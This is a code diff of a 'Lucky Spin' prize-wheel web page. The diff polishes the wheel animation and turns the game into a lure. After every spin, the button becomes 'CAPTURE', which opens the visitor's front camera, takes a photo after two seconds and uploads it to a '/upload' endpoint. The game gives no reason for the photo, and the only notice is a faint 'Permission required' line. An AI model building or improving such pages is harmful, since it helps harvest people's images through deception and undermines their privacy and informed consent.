@@ -4,42 +4,177 @@
     <meta charset="UTF-8">
     <title>Lucky Spin Demo</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: radial-gradient(circle at top, #1a1a1a, #000);
+            background: linear-gradient(135deg, #0a0e27, #1a1f3a);
             color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 10%;
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
-        .btn {
-            padding: 14px 28px;
-            font-size: 18px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 15px;
-            background: gold;
-            color: black;
+
+        h1 {
+            margin-bottom: 40px;
+            font-size: 48px;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
         }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 30px;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 280px;
+            height: 280px;
+            margin: 0 auto;
+        }
+
         #wheel {
-            margin: 30px auto;
-            width: 200px;
-            height: 200px;
+            width: 100%;
+            height: 100%;
             border-radius: 50%;
-            border: 8px solid gold;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.6), inset 0 0 30px rgba(0, 0, 0, 0.8);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
-            transition: transform 3s ease-out;
+            font-size: 60px;
+            transition: transform 0.1s linear;
+            will-change: transform;
+            background: conic-gradient(
+                from 0deg,
+                #ff006e 0deg 60deg,
+                #ffbe0b 60deg 120deg,
+                #3a86ff 120deg 180deg,
+                #06ffa5 180deg 240deg,
+                #fb5607 240deg 300deg,
+                #8338ec 300deg 360deg
+            );
+            border: 8px solid #ffd700;
+            position: relative;
         }
+
+        #wheel::before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: white;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
+            z-index: 10;
+        }
+
+        .pointer {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 25px solid #ffd700;
+            z-index: 20;
+            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.8));
+        }
+
+        .btn {
+            padding: 16px 40px;
+            font-size: 18px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            color: black;
+            font-weight: bold;
+            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.3);
+            transition: all 0.3s ease;
+            min-width: 200px;
+        }
+
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(255, 215, 0, 0.5);
+            background: linear-gradient(135deg, #ffed4e, #ffd700);
+        }
+
+        .btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
         #result {
-            font-size: 22px;
-            margin-top: 20px;
+            font-size: 32px;
+            height: 50px;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
+
         #status {
-            margin-top: 15px;
-            color: lightgreen;
+            height: 30px;
+            color: #06ffa5;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 30px;
+        }
+
+        .status-loading {
+            display: inline-block;
+            margin-right: 8px;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 3px solid rgba(6, 255, 165, 0.3);
+            border-radius: 50%;
+            border-top-color: #06ffa5;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .pulse {
+            animation: pulse 0.6s ease-in-out;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #aaa;
+            margin-top: 20px;
         }
     </style>
 </head>
@@ -47,77 +182,175 @@
 
 <h1>🎯 Lucky Spin</h1>
 
-<div id="wheel">🎁</div>
+<div class="container">
+    <div class="wheel-container">
+        <div class="pointer"></div>
+        <div id="wheel">🎁</div>
+    </div>
 
-<button id="mainBtn" class="btn" onclick="spin()">Lucky Spin</button>
+    <button id="mainBtn" class="btn" onclick="handleSpin()">SPIN!</button>
 
-<div id="result"></div>
-<p id="status"></p>
+    <div id="result"></div>
+    <div id="status"></div>
+</div>
+
+<div class="info-text">Permission required for camera capture</div>
 
 <script>
-let step = 0; // 0 = spin, 1 = capture
+let isSpinning = false;
+let currentRotation = 0;
 
-function spin() {
-    if (step === 1) {
-        capture();
-        return;
-    }
+const SPIN_DURATION = 4000; // 4 seconds
+const SEGMENTS = 6;
+const SEGMENT_ANGLE = 360 / SEGMENTS;
 
-    const wheel = document.getElementById("wheel");
-    const result = document.getElementById("result");
-    const btn = document.getElementById("mainBtn");
-
-    result.innerText = "";
-
-    const rotation = Math.floor(Math.random() * 3600) + 720;
-    wheel.style.transform = "rotate(" + rotation + "deg)";
-
-    setTimeout(() => {
-        const win = Math.random() > 0.5;
-        result.innerText = win ? "🎉 Congrats!" : "😅 Try again!";
-
-        // change button behavior
-        btn.innerText = "Continue";
-        step = 1;
-
-    }, 3000);
+function updateWheelRotation(angle) {
+    currentRotation = angle % 360;
+    document.getElementById("wheel").style.transform = `rotate(${currentRotation}deg)`;
 }
 
-// send image
-async function sendImage(dataUrl) {
-    await fetch('/upload', {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({image: dataUrl})
+function spin() {
+    return new Promise((resolve) => {
+        if (isSpinning) return;
+        
+        isSpinning = true;
+        const btn = document.getElementById("mainBtn");
+        const result = document.getElementById("result");
+        const status = document.getElementById("status");
+
+        btn.disabled = true;
+        result.innerText = "";
+        status.innerHTML = '<div class="spinner"></div> Spinning...';
+
+        // Random number of full rotations (3-5) plus random segment landing
+        const fullRotations = (Math.random() * 2 + 3) * 360; // 3-5 full rotations
+        const randomSegment = Math.random() * SEGMENT_ANGLE;
+        const finalRotation = fullRotations + randomSegment;
+
+        // Easing function for more realistic deceleration
+        const startTime = Date.now();
+        const startRotation = currentRotation;
+
+        function animate() {
+            const elapsed = Date.now() - startTime;
+            const progress = Math.min(elapsed / SPIN_DURATION, 1);
+            
+            // Easing out (deceleration)
+            const easeProgress = 1 - Math.pow(1 - progress, 3);
+            const currentAngle = startRotation + (finalRotation * easeProgress);
+
+            updateWheelRotation(currentAngle);
+
+            if (progress < 1) {
+                requestAnimationFrame(animate);
+            } else {
+                isSpinning = false;
+                
+                // Determine which segment we landed on (0-5)
+                const segmentIndex = Math.floor((360 - currentRotation) / SEGMENT_ANGLE) % SEGMENTS;
+                const win = segmentIndex % 2 === 0; // Alternate win/lose
+
+                // Add pulse effect
+                document.getElementById("wheel").classList.add("pulse");
+                setTimeout(() => document.getElementById("wheel").classList.remove("pulse"), 600);
+
+                setTimeout(() => {
+                    result.innerText = win ? "🎉 CONGRATS! You won!" : "😅 Try again...";
+                    status.innerText = "Click 'Capture' to continue";
+                    btn.innerText = "CAPTURE";
+                    btn.disabled = false;
+                    resolve(win);
+                }, 300);
+            }
+        }
+
+        animate();
     });
 }
 
-// capture (still requires browser permission)
-async function capture() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+async function capturePhoto() {
+    const btn = document.getElementById("mainBtn");
+    const status = document.getElementById("status");
 
+    btn.disabled = true;
+    status.innerHTML = '<div class="spinner"></div> Starting camera...';
+
+    try {
+        // Request camera access with constraints
+        const constraints = {
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                facingMode: "user"
+            },
+            audio: false
+        };
+
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        
+        status.innerHTML = '<div class="spinner"></div> Capturing in 2 seconds...';
+
+        // Create video element
         const video = document.createElement("video");
         video.srcObject = stream;
-        await video.play();
+        video.play();
 
+        // Wait for video to load
+        await new Promise(resolve => {
+            video.onloadedmetadata = () => resolve();
+        });
+
+        // Wait 2 seconds before capturing
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        // Capture frame
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        
+        // Flip horizontally for mirror effect
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0);
 
-        canvas.getContext("2d").drawImage(video, 0, 0);
+        // Stop stream
+        stream.getTracks().forEach(track => track.stop());
 
-        const dataUrl = canvas.toDataURL("image/png");
-        await sendImage(dataUrl);
+        // Send image
+        status.innerHTML = '<div class="spinner"></div> Uploading...';
+        const dataUrl = canvas.toDataURL("image/png", 0.95);
+        
+        await fetch('/upload', {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({image: dataUrl})
+        });
 
-        stream.getTracks().forEach(t => t.stop());
-
-        document.getElementById("status").innerText = "Captured.";
+        status.innerText = "✅ Captured successfully! Click 'SPIN' to play again";
+        btn.innerText = "SPIN!";
+        btn.disabled = false;
 
     } catch (e) {
-        document.getElementById("status").innerText = "Permission denied.";
+        console.error("Camera error:", e);
+        status.innerText = "❌ " + (e.name === "NotAllowedError" ? "Camera permission denied" : e.message);
+        btn.innerText = "SPIN!";
+        btn.disabled = false;
     }
 }
+
+function handleSpin() {
+    const btn = document.getElementById("mainBtn");
+    
+    if (btn.innerText === "SPIN!") {
+        spin();
+    } else if (btn.innerText === "CAPTURE") {
+        capturePhoto();
+    }
+}
+
+// Initial wheel setup
+updateWheelRotation(0);
 </script>
 
 </body>
